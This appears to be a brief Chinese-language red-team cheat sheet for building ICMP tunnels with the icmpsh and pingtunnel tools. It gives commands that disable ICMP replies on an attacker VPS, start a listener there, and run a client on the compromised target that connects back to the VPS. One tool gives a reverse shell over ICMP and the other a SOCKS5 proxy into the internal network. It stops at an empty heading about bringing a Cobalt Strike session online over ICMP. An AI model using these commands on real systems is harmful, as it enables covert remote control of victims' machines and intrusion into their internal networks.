icmpsh:
  工具地址：git https://github.com/bdamele/icmpsh.git
  vps：
  关闭icmp的回复：sysctl -w net.ipv4.icmp_echo_ignore_all=1
  在工具目录下运行工具:python2 icmpsh_m.py vps_echo_ip   目标机器出口的公网ip
  目标机器:
  icmpsh.exe -t vps_ip -d 500 -b 30 -s 120           -d是延迟，-b是最大空格数及未应答的icmp请求数，-s是最大数据缓冲区字节大小
  icmpsh.exe要上传才能用（

pingtunnel:
  vps:
  关闭icmp回复
  启动服务端 ./pingtunnel -type server -noprint 1 -nolog 1
  目标主机：
  pingtunnel.exe -type client -l :1080 -s vps_ip  -socks5 1 -noprint 1 -nolog 1


用以上任意一个工具均可搭建icmp隧道
隧道搭建后使用代理工具代理vps_ip:1080,即可访问内网资源

icmp上线cs：
